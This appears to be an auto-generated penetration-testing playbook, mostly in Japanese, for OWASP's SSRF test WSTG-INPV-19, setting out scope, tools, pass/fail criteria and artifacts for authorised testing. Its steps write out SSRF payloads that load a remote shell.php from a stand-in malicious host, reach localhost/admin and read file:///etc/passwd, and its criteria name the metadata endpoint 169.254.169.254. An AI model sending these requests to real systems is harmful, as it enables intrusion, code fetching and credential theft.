# WSTG-INPV-19 — Testing for Server-Side Request Forgery

<!-- 自動生成: scripts/gen_playbooks.py — このファイルを直接編集しない。
     判定基準は matrix/criteria.yaml、アクティビティは matrix/coverage.yaml を直す。 -->

## 目的

サーバに任意の宛先へリクエストさせられないかを確認する。

WSTG の Test Objectives:

- Identify SSRF injection points.
- Test if the injection points are exploitable.
- Asses the severity of the vulnerability.

## 前提 / スコープ

- 対象: 検査スコープ内のホスト・アプリ
- 権限: 必要な認証済みアカウント（ロールごとに1つ）
- 準備: プロキシ設定・スコープ制限（対象外ホストへ飛ばさない）

## 手順

1. **Load the Contents of a File** — `GET https://example.com/page?page=https://malicioussite.com/shell.php
2. **Access a Restricted Page** — `GET https://example.com/page?page=http://localhost/admin
3. **Fetch a Local File** — `GET https://example.com/page?page=file:///etc/passwd
4. **HTTP Methods Used** — All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
5. **PDF Generators** — In some cases, a server may convert uploaded files to PDF format
6. **Common Filter Bypass** — Some applications block references to localhost and 127.0.0.1

## 使用ツール

- Burp Collaborator
- interactsh
- curl

## 判定基準（pass / fail の見分け）

- **pass**: 外部 URL 指定が許可リストで制限され、内部アドレス・メタデータエンドポイントへ到達できない。
- **fail**: 内部 IP・169.254.169.254・localhost への到達や、外部への任意リクエスト（DNS/HTTP）ができる。
- 補足: 盲目的 SSRF は Collaborator/interactsh の受信ログを証拠にする。

## 記録すべき成果物（run.yaml へ）

- `commands:` — `scripts/run_cmd.py` 経由で実行したコマンドは自動で残る
- `steps:` — GUI（Burp 等）の操作は手記録
- `artifacts:` — `artifacts/ssrf-findings.md`, `cmd/ssrf-probe.txt`
- `covers:` — `{id: WSTG-INPV-19, verdict: pass|fail|info|na, finding: 要約, evidence: パス}`

## カバーするアクティビティ

- `ssrf-probe` — SSRF の検証

原文: https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
